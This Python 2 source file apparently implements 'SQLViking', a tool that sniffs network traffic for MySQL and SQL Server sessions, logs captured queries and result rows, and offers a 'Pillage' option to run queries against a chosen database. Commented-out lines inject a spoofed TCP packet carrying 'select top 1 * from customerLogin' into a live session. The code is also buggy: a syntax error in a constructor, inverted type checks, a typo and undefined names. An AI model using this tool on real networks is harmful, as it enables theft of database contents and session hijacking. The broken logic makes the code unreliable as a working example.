import sys,threading,time,logging,os
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Queue import Queue
from sys import path
path.append("pymysql/")
import connections
path.append("pytds/")
import sqlserver

pkts=Queue()
queries=Queue()

REQUEST     = 1
RESPONSE    = 2
MYSQL       = 10
MYSQLREQ    = 11
MYSQLRESP   = 12
SQLSERV     = 20
SQLSERVREQ  = 21
SQLSERVRESP = 22
UNKNOWN     = 99

class Conn():
    def __init__(self,cip,cport,db):
        self.cip = cip
        self.cport = cport
        self.db = db

class DataBase():
    def __init__(self,ip,port,name=UNKNOWN,dbtype):
        self.ip = ip
        self.port = port
        self.name = name
        self.dbtype = dbtype
        self.traffic = []

class Parse(threading.Thread):
    #TODO: need to be able to set MTU from cmdline
    def __init__(self,mtu=1500):
        threading.Thread.__init__(self)
        self.die = False
        self.mtu = mtu
        self.frag = {}
        self.res = ''
        self.knownConns = []
        self.knownDBs = []
        self.knownDBServs = {}

    def run(self):
        global pkts
        while not self.die:
            if not pkts.empty():
                self.handle(pkts.get())

    def parse(self,pkt,db=None):
        pktType = UNKNOWN
        if db:
            if db.type == SQLSERV:
                if pkt[IP].src == db.ip:
                    pktType = SQLSERVRESP
                else:
                    pktType = SQLSERVREQ
            elif db.type == MYSQL:
                if pkt[IP].src == db.ip:
                    pktType = MYSQLRESP
                else:
                    pktType = MYSQLREQ

        if pktType != UNKNOWN:
            pktType = self.isMySql(pkt)
        elif pktType != UNKNOWN:
            pktType = self.isSqlServ(pkt)

        if pktType == MYSQLREQ:
            self.parseMySqlReq(pkt,db)
        elif pktType == MYSQLRESP:
            self.parseMySqlResp(pkt,db)
        elif pktType == SQLSERVREQ:
            self.parseSqlServReq(pkt,db)
        elif pktType == SQLSERVRESP:
            self.parseSqlServResp(pkt,db)

        return pktType

    def isMySql(self, pkt):
        pktlen = len(pkt)/2
        lengths=[]
        while len(pkt)>0:
            length = int(self.flipEndian(pkt[:6]),16)
            lengths.append(length)
            pkt = pkt[8+(length*2):]

        tlen=0
        for l in lengths:
            tlen+=l
        tlen+= len(lengths)*4

        if tlen == pktlen:
            if self.isMySqlReq(pkt):
                return MYSQLREQ
            else:
                return MYSQLRESP
        else:
            return UNKNOWN

    def isMySqlReq(self,pkt):    
        return True

    def isMySqlResp(self,pkt):
        return True

    def isSqlServ(self,pkt):
        return UNKNOWN

    def isSqlServReq(self,pkt):
        return False

    def isSqlServResp(self,pkt):
        return False

    def flipEndian(self,data):
        resp=''
        for i in range(0,len(data),2):
            resp = data[i]+data[i+1]+resp
        return resp

    def inConn(self,c,pkt):
        if c.cip == pkt[IP].dst and c.cport == pkt[TCP].dport and c.db.ip == pkt[IP].src and c.db.port == pkt[TCP].sport:
            return RESPONSE
        elif c.cip == pkt[IP].src and c.cport == pkt[TCP].sport and c.db.ip == pkt[IP].dst and c.db.port == pkt[TCP].dport:
            return REQUEST

    def getConn(self,pkt):
        for c in self.knownConns:
            if self.inConn(c,pkt):
                return c

    def removeConn(self,pkt):
        for c in self.knownConns:
            if self.isConn(c,pkt):
                del self.knownConns[self.knownConns.index(c)]
                break

    def isKnownDB(self,pkt):
        for db in self.knownDBs:
            if pkt[IP].dst == db.ip and pkt[TCP].dport == dp.port:
                return db
            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port:
                return db

    def findDB(self,ip,port):
        for db in self.knownDBs:
            if ip == db.ip and port == db.port:
                return db

    def addConn(self,pkt,db):
        if pkt[IP].dst == db.port:
            c = Conn(pkt[IP].src,pkt[TCP].sport,db)
        else:
            c = Conn(pkt[IP].dst,pkt[TCP].dport,db)
        self.knownConns.append(c)

    def handle(self,pkt):
        #pkt in knownConn?
        c = self.getConn(pkt)
        if c:
            #pkt have fin/ack?
            if pkt[TCP].flags == "FA":
                #remove from knownConns; break
                del self.knownConns[self.knownConns.index(c)]
                return
            #parse accordingly; break
            self.parse(pkt,c.db)
            return
        
        #pkt to/from knownDB?
        db = self.isKnownDB(pkt)
        if db:
            self.parse(pkt,db)
        #pkt a sqlserv/mysql req?
        pktType = self.parse(pkt)
        if pktType == MYSQLRESP:
            ip = pkt[IP].src
            port = pkt[TCP].sport
            dbtype = MYSQL
        elif pktType == MYSQLREQ:
            ip = pkt[IP].dst
            port = pkt[TCP].dport
            dbtype = MySQL
        elif pktType == SQLSERVRESP:
            ip = pkt[IP].src
            port = pkt[TCP].sport
            dbtype = SQLSERV
        elif pktType == SQLSERVREQ:
            ip = pkt[IP].dst
            port = pkt[TCP].dport
            dbtype = SQLSERV

        if ip and port and dbtype:
            db = DataBase(ip=ip,port=port,dbtype=dbtype)

    #def parse(self,pkt):
        #TODO: determining parser by port. need to account for DBs on non-standard ports.
        #print '\nSource:\t%s\nTCP Val:\t%s\nAck:\t%s\nSeq:\t%s\n'%(pkt[IP].src,str(pkt[TCP]).encode('hex'),pkt[TCP].ack,pkt[TCP].seq)
        #if pkt[TCP].sport == 1433 or pkt[TCP].sport == 3306:
            #reassesmble pkts if fragged
        #    key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
        #    if len(str(pkt[IP])) == self.mtu:
        #        try:
        #            self.frag[key]+=str(pkt[TCP])[20:]
        #        except KeyError:
        #            self.frag[key]=str(pkt[TCP])[20:]
        #    else:
        #        try:
        #            if pkt[TCP].sport == 1433:
        #                self.parseSqlServResp(self.frag[key]+str(pkt[TCP])[20:])
        #            else:
        #                self.parseMySqlResp(self.frag[key]+str(pkt[TCP])[20:])
        #            del self.frag[key]
        #        except KeyError:
        #            if pkt[TCP].sport == 1433:
        #                self.parseSqlServResp(str(pkt[TCP])[20:])
        #            else:
        #                self.parseMySqlResp(str(pkt[TCP])[20:])
        #elif pkt[TCP].dport == 1433:
            #Pillage POC
            #if len(pkt[TCP]) == 26:
            #    req = sqlserver.Request()
            #    send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
        #    self.parseSqlServReq(str(pkt[TCP]).encode('hex')[40:])
        #elif pkt[TCP].dport == 3306:
        #    self.parseMySqlReq(str(pkt[TCP]).encode('hex')[40:])

    def validAscii(self,h):
        if int(h,16)>31 and int(h,16)<127:
            return True
        return False

    def readable(self,data):
        a=""
        for i in range(0,len(data),2):
            if self.validAscii(data[i:i+2]):
                a+=data[i:i+2].decode('hex')
        return a

    def formatTuple(self,t):
        res=''
        for i in t:
            res+="%s, "%i
        return res[:-2]

    def parseMySqlReq(self,data):
        self.logres("\n--MySQL Req--\n")
        self.logres("Raw: %s\n"%data)
        self.logres("ASCII: %s\n"%self.readable(data))

    def parseMySqlResp(self,data):
        self.logres("\n--MySQL Resp--\n")
        res = connections.MySQLResult(connections.Result(data))
        try:
            res.read()
            self.logres('[*] Message:\t%s\n'%str(res.message))
            self.logres('[*] Description:\t%s\n'%str(res.description))
            self.logres('[*] Rows:\n')
            if len(res.rows)>0:
                for r in res.rows:
                    self.logres(self.formatTuple(r))
                self.logres('\n')
        except:
            self.logres('[!] Error:\t%s\n'%sys.exc_info()[1])
        self.logres('[*] Raw:\t%s\n'%str(data).encode('hex'))

    def parseSqlServReq(self,data):
        self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))

    def parseSqlServResp(self,data):
        resp = sqlserver.Response(data)
        resp.parse()
        
        if len(resp.messages) > 0:
            self.logres("--SQLServ Resp--\n%s"%resp.messages[0]['message'])
        else:
            self.logres("--SQLServ Resp--\n%s"%resp.results)

    def println(self):
        print(self.res)
        self.res=''

    def writeln(self,path):
        with file(path,'w') as f:
            f.write(self.res)

    def logres(self,s):
        self.res+=s

class Scout(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)
            self.die = False
        
    def run(self):
        self.scout()

    def scout(self):
        while not self.die:
            try:
                sniff(prn=self.pushToQueue,filter="tcp",store=0,timeout=5)
            except:
                print sys.exc_info()[1]
                self.die = True

    def pushToQueue(self,pkt):
        global pkts
        pkts.put(pkt)
    
class Pillage(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.die = False

    def run(self):
        global queries
        while not self.die:
            if not queries.empty():
                q = queries.get()
                print('[*] Executing query:\t%s'%q[0])
                print('[*] Targetting:\t%s'%q[1])

def writeResults(t):
    print('[*] Enter filepath to write to:')
    path = raw_input("> ")
    t.writeln(path)  

def printResults():
    print('[*] Results so far:')

def pillage():
    global queries
    print('[*] Enter query to execute:')
    query = raw_input("> ")
    print('[*] Enter IP:port to execute against:')
    dst = raw_input("> ")
    print('[*] Run %s against %s? [y/n]'%(query,dst))
    ans = raw_input("> ")
    if ans == 'y':
        queries.put([query,dst])
        print('[*] Query will run as soon as possible')
    else:
        print('[*] Cancelling...')
    time.sleep(3)

def parseInput(input,t):
    if input == 'w':
        writeResults(t)
    elif input == 'p':
    	#TODO: need parsing thread to save all data to a globally accessible data structure. another queue? 
        t.println()
    elif input == 'r':
        pillage()
    elif input == 'q':
        raise KeyboardInterrupt
    else:
        print('Unknown command entered')    

def wipeScreen():
    y,x = os.popen('stty size', 'r').read().split()
    print('\033[1;1H')
    for i in range(0,int(y)):
	    print(' '*int(x))
    print('\033[1;1H')

def printMainMenu(wipe=True):
    wipeScreen()
    y,x = os.popen('stty size', 'r').read().split()
    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
    print('\n[*] Menu Items:')
    print('\tw - dump current results to file specified')
    #TODO: menu printing wipes all printed data
    #print('\tp - print current results to screen')
    print('\tr - run a query against a specified DB')
    print('\tq - quit')

def main():
    #TODO: better menu. running counter of reqs/resps capped and DBs discovered.
    
    #send(IP(dst="192.168.37.135",src="192.168.37.1")/TCP(dport=1433,sport=9999,seq=270991360,ack=270991360)/"select top 1 * from customerLogin")

    t1 = Scout()
    t2 = Parse()
    t3 = Pillage()
    t1.start()
    t2.start()
    t3.start()

    while True:
        printMainMenu()
        try:
            parseInput(raw_input("\n> "),t2)
        except KeyboardInterrupt:
            print('\n[!] Shutting down...')
            t1.die = True
            t2.die = True
            t3.die = True
            break
        except:
            t1.die = True
            t2.die = True
            t3.die = True
            print sys.exc_info()[1]
            break
    
if __name__ == "__main__":
    main()
